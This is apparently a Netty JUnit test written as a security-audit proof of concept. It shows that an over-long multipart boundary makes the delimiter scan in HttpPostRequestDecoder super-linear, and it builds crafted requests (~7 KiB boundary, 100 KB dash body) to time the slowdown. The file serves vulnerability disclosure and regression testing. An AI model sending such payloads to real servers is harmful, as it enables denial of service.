/*
 * Copyright 2026 The Netty Project
 *
 * The Netty Project licenses this file to you under the Apache License,
 * version 2.0 (the "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at:
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */
package io.netty.handler.codec.http.multipart;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.handler.codec.http.DefaultHttpContent;
import io.netty.handler.codec.http.DefaultHttpRequest;
import io.netty.handler.codec.http.DefaultLastHttpContent;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpVersion;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * RedCell audit PoC for Finding #6.
 *
 * <p>{@code HttpPostBodyUtil.findDelimiter} scans the part body for the multipart boundary with an
 * inner byte-by-byte compare that advances one position on mismatch, so it is O(N * delimiterLength).
 * {@code HttpPostRequestDecoder.getMultipartDataBoundary} takes the boundary from the request
 * {@code Content-Type} with NO length validation (RFC 2046 §5.1.1 caps a boundary at 70 chars; Netty
 * does not enforce it - it is bounded only by {@code maxHeaderSize}, ~8 KiB by default).
 *
 * <p>An attacker who sends a multipart upload whose boundary is ~7 KiB and whose part body is a long
 * run of the boundary's first byte ({@code '-'}) makes the decoder pay ~boundaryLength comparisons at
 * every body offset. This test feeds the SAME all-{@code '-'} body with a tiny boundary and with a
 * ~7 KiB boundary and reports the wall-clock decode time of each to demonstrate the super-linear
 * (O(N*k)) blow-up in the attacker-controlled boundary length {@code k}.
 */
public class AuditPocMultipartBoundaryTest {

    private static final int DATA_DASHES = 100_000; // ~100 KB part body, all '-'

    private static String repeat(char c, int n) {
        char[] cs = new char[n];
        Arrays.fill(cs, c);
        return new String(cs);
    }

    /**
     * Decode one multipart request whose single part body is {@code dataDashes} '-' bytes.
     * Returns the wall-clock nanos spent in the streaming {@code offer(...)} decode path.
     */
    private static long decodeMultipart(String boundary, int dataDashes) {
        String header =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"f\"\r\n" +
                "\r\n";
        byte[] headerBytes = header.getBytes(StandardCharsets.US_ASCII);
        byte[] dataBytes = new byte[dataDashes];
        Arrays.fill(dataBytes, (byte) '-');
        byte[] trailerBytes = ("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.US_ASCII);

        ByteBuf body = Unpooled.buffer(headerBytes.length + dataBytes.length + trailerBytes.length);
        body.writeBytes(headerBytes).writeBytes(dataBytes).writeBytes(trailerBytes);

        HttpRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, "/upload");
        request.headers().set(HttpHeaderNames.CONTENT_TYPE, "multipart/form-data; boundary=" + boundary);

        HttpPostRequestDecoder decoder =
                new HttpPostRequestDecoder(new DefaultHttpDataFactory(false), request);
        long start = System.nanoTime();
        decoder.offer(new DefaultHttpContent(body));
        decoder.offer(new DefaultLastHttpContent());
        long elapsed = System.nanoTime() - start;
        decoder.destroy();
        return elapsed;
    }

    // Build a boundary whose resulting delimiter ("--" + boundary) is exactly delimLen bytes and ends
    // in 'X', so an all-'-' body never matches it except at the genuine closing boundary (forcing a full scan).
    private static String boundaryForDelimiterLength(int delimLen) {
        return repeat('-', delimLen - 3) + "X";
    }

    // Minimum decode time over a few reps - min is the cleanest estimator since it removes
    // one-off GC pauses / JIT recompiles that otherwise add noise to a single measurement.
    private static long minDecodeNs(String boundary, int dataDashes, int reps) {
        long best = Long.MAX_VALUE;
        for (int i = 0; i < reps; i++) {
            best = Math.min(best, decodeMultipart(boundary, dataDashes));
        }
        return best;
    }

    @Test
    public void boundaryLengthDrivesSuperLinearDecodeCost() {
        // Warm up the JIT for findDelimiter with both a tiny and a large boundary shape.
        for (int i = 0; i < 3; i++) {
            decodeMultipart(boundaryForDelimiterLength(3), 5_000);
            decodeMultipart(boundaryForDelimiterLength(7000), 5_000);
        }

        // Same body (same N), sweeping only the attacker-controlled boundary length k.
        int[] delimLens = {3, 1750, 3500, 7000};
        long[] timesNs = new long[delimLens.length];
        for (int i = 0; i < delimLens.length; i++) {
            timesNs[i] = minDecodeNs(boundaryForDelimiterLength(delimLens[i]), DATA_DASHES, 5);
        }

        long baselineNs = timesNs[0]; // ~fixed per-request overhead (delimiter scan is negligible at k=3)
        System.out.printf("[AuditPoc#6] body=%d '-' bytes; sweeping boundary length k (fixed N):%n", DATA_DASHES);
        for (int i = 0; i < delimLens.length; i++) {
            double totalMs = timesNs[i] / 1e6;
            double scanMs = (timesNs[i] - baselineNs) / 1e6; // boundary-length-attributable component
            System.out.printf("    delimiterLen=%5d  decode=%7.2f ms  (scan component ~%7.2f ms)%n",
                    delimLens[i], totalMs, scanMs);
        }

        // The boundary-length-attributable scan time grows ~linearly with k => O(N*k) confirmed.
        // A linear/bounded matcher would keep this ~flat regardless of k.
        long hugeNs = timesNs[delimLens.length - 1];
        assertTrue(hugeNs > baselineNs * 10,
                "Expected the ~7 KB boundary to be far slower than the 3-byte boundary for the same body; "
                        + "baseline=" + baselineNs + "ns huge=" + hugeNs + "ns");
    }
}
